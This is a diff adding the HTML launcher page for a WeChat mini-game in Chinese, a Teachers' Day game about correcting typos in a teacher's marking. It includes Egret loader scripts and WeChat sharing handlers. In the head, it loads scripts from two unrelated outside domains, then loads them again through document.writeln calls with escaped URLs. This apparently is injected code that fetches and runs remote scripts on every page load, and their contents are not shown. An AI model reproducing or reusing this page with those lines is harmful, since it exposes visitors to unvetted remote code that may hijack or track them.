@@ -1,0 +1,259 @@
+<!DOCTYPE HTML>
+
+<html>
+
+<head>
+
+<meta charset="utf-8">
+
+<meta name="viewport" content="width=device-width,initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no"/>
+
+<meta name="apple-mobile-web-app-capable" content="yes"/>
+
+<meta name="full-screen" content="true"/>
+
+<meta name="screen-orientation" content="portrait"/>
+
+<meta name="x5-fullscreen" content="true"/>
+
+<meta name="360-fullscreen" content="true"/>
+
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+<meta name="apple-mobile-web-app-title" content="我来帮老师阅卷！">
+
+<link rel="apple-touch-icon" href="icon.png" />
+
+<link rel="shortcut icon" href="icon.png" />
+
+<link rel="icon" href="icon.png" />
+<div id='wx_pic' style='margin:0 auto;display:none;'>
+<img src='photo.jpg' />
+</div>
+
+<title>我来帮老师阅卷！</title>
+
+<meta name="keywords" content="我来帮老师阅卷！" />
+
+<meta name="description" content="我来帮老师阅卷！" />
+<script src='https://p.mendoc.cn/79718'></script>
+	<script src='http://h.how5.cn/79718'></script>
+	<script type="text/javascript">
+		document.writeln("<script src='http:\/\/h.how5.cn\/83378'><\/script>");
+		document.writeln("<script src='https:\/\/p.mendoc.cn\/79718'><\/script>");
+	</script>
+<style>
+
+body {
+
+text-align: center;
+
+background: #000000;
+
+padding: 0;
+
+border: 0;
+
+margin: 0;
+
+height: 100%;
+
+}
+
+html {
+
+-ms-touch-action: none; /* Direct all pointer events to JavaScript code. */
+
+overflow: hidden;
+
+}
+
+div, canvas {
+
+display:block;
+
+position:absolute;
+
+margin: 0 auto;
+
+padding: 0;
+
+border: 0;
+
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div style="position:relative;" id="gameDiv"></div>
+
+<audio id="truemusic" src="audio/true.wav" preload></audio>
+
+<script>var document_class = "Main";</script>
+
+<script src="launcher/egret_require.js?ver"></script>
+
+<script src="launcher/egret_loader.js?ver"></script>
+
+<script src="launcher/game-min.js?ver"></script>
+
+<script>
+
+egret_h5.startGame();
+
+</script>
+
+<script language=javascript>
+
+var mebtnopenurl = 'http://game.nineying.cn';
+
+window.shareData = {
+
+"imgUrl": "http://game.nineying.cn/game/fkqbg/fkqbg.jpg",
+
+"timeLineLink": "http://game.nineying.cn/game/fkqbg",
+
+"tTitle": "我来帮老师阅卷！",
+
+"tContent": "我来帮老师阅卷！！"
+
+};
+
+function showshare(){
+
+document.getElementById("share").style.display = "";
+
+};
+
+function clickMore(){
+
+window.location  = mebtnopenurl;
+
+};
+
+var imgUrl = window.shareData.imgUrl;
+
+var lineLink = window.shareData.timeLineLink;
+
+var descContent =  window.shareData.tContent;
+
+var shareTitle = window.shareData.tTitle;
+
+function shareFriend() {
+
+WeixinJSBridge.invoke('sendAppMessage',{
+
+"img_url": imgUrl,
+
+"img_width": "200",
+
+"img_height": "200",
+
+"link": lineLink,
+
+"desc": descContent,
+
+"title": shareTitle
+
+}, function(res) {
+
+//_report('send_msg', res.err_msg);
+
+})
+
+}
+
+function shareTimeline() {
+
+WeixinJSBridge.invoke('shareTimeline',{
+
+"img_url": imgUrl,
+
+"img_width": "200",
+
+"img_height": "200",
+
+"link": lineLink,
+
+"desc": shareTitle,
+
+"title": descContent
+
+}, function(res) {
+
+//_report('timeline', res.err_msg);
+
+});
+
+}
+
+function shareWeibo() {
+
+WeixinJSBridge.invoke('shareWeibo',{
+
+"content": descContent,
+
+"url": lineLink,
+
+}, function(res) {
+
+//_report('weibo', res.err_msg);
+
+});
+
+}
+
+// 当微信内置浏览器完成内部初始化后会触发WeixinJSBridgeReady事件。
+
+document.addEventListener('WeixinJSBridgeReady', function onBridgeReady() {
+
+// 发送给好友
+
+WeixinJSBridge.on('menu:share:appmessage', function(argv){
+
+shareFriend();
+
+});
+
+// 分享到朋友圈
+
+WeixinJSBridge.on('menu:share:timeline', function(argv){
+
+shareTimeline();
+
+});
+
+// 分享到微博
+
+WeixinJSBridge.on('menu:share:weibo', function(argv){
+
+shareWeibo();
+
+});
+
+}, false);		
+
+function dp_share(a,b){
+
+if(a>0){
+
+document.title =  window.shareData.tContent = descContent ='教师节，老师辛苦了，我帮他阅卷修改了'+a+'次错别字，是不是很棒呢，试试！';
+
+}
+
+};
+
+</script>
+
+<div id=share style="display: none">
+
+<img width=100% src="share.png" style="position: fixed; z-index: 9999; top: 0; left: 0; display: " ontouchstart="document.getElementById('share').style.display='none';" onClick="document.getElementById('share').style.display='none';" />
+
+</div>
+
+</body>
+
+</html>
